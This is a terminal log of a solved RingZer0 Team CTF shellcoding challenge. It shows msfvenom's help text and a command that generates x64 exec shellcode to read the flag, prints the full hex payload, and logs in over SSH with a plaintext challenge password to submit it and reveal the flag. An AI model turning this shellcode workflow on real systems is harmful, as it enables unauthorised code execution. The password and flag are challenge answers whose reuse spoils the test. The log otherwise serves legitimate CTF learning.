MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message

[root@iGenius138 ~]$ msfvenom -b '\x00' -p linux/x64/exec CMD="/bin/cat /flag/level1.flag" | hexdump -ve '1/1 "\\\x%.2x"'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.6.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/object/duplicable.rb:111: warning: BigDecimal.new is deprecated; use BigDecimal() method instead.
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=13, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 111 (iteration=0)
x64/xor chosen with final size 111
Payload size: 111 bytes

\x48\x31\xc9\x48\x81\xe9\xf7\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x57\x3a\xd3\x0f\x9d\x3c\x48\x10\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x3d\x01\x8b\x96\xd5\x87\x67\x72\x3e\x54\xfc\x7c\xf5\x3c\x1b\x58\xde\xdd\xbb\x22\xfe\x3c\x48\x58\xde\xdc\x81\xe7\x86\x3c\x48\x10\x78\x58\xba\x61\xb2\x5f\x29\x64\x77\x15\xb5\x63\xfc\x5b\x67\x7c\x32\x4c\xb6\x63\xac\x12\x2e\x7c\x36\x5d\xd3\x59\xca\x74\xc1\xf6\x58\x3f\xd3\x0f\x9d\x3c\x48\x10

[root@iGenius138 ~]$ ssh level1@challenges.ringzer0team.com -p10127
level1@challenges.ringzer0team.com's password: 50g8O1R0C42nP7N

 888888ba  oo                   d8888888P                    a8888a  d888888P
 88     8b                           .d8'                   d8    8b    88
 88aaaa8P  dP 88d888b. .d8888b.    .d8'   .d8888b. 88d888b. 88  P 88    88    .d8888b. .d8888b. 88d8b.d8b.
 88    8b. 88 88    88 88    88  .d8'     88ooood8 88    88 88 d  88    88    88ooood8 88    88 88  88  88
 88     88 88 88    88 88    88 d8'       88.  ... 88       Y8    8P    88    88.  ... 88    88 88  88  88
 dP     dP dP dP    dP `8888P88 Y8888888P `88888P' dP        Y8888P     dP    `88888P' `88888P8 dP  dP  dP
oooooooooooooooooooooooo     88 ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
                        d8888P

                                    +---------------------------------+
                                    |  Challenges are in /Challenges  |
                                    |  Flags are in /Challenges/Flags |
                                    |                                 |
                                    |   - Play nice and play Fair -   |
                                    |                                 |
                                    |----[ info@ringzer0team.com ]----|
Last login: Sun Apr 21 15:32:42 2019 from 171.241.105.102

RingZer0 Team CTF Shellcoding Level 1
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have no shellcode restriction.
You main goal is to read /flag/level1.flag

shellcode>\x48\x31\xc9\x48\x81\xe9\xf7\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x57\x3a\xd3\x0f\x9d\x3c\x48\x10\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x3d\x01\x8b\x96\xd5\x87\x67\x72\x3e\x54\xfc\x7c\xf5\x3c\x1b\x58\xde\xdd\xbb\x22\xfe\x3c\x48\x58\xde\xdc\x81\xe7\x86\x3c\x48\x10\x78\x58\xba\x61\xb2\x5f\x29\x64\x77\x15\xb5\x63\xfc\x5b\x67\x7c\x32\x4c\xb6\x63\xac\x12\x2e\x7c\x36\x5d\xd3\x59\xca\x74\xc1\xf6\x58\x3f\xd3\x0f\x9d\x3c\x48\x10
	Shellcode received...
	Shellcode length (111) bytes.

	Success: Executing shellcode...

FLAG-1Ql864uTj8pY2470t85VX42q1B
Connection to challenges.ringzer0team.com closed.

=> FLAG-1Ql864uTj8pY2470t85VX42q1B
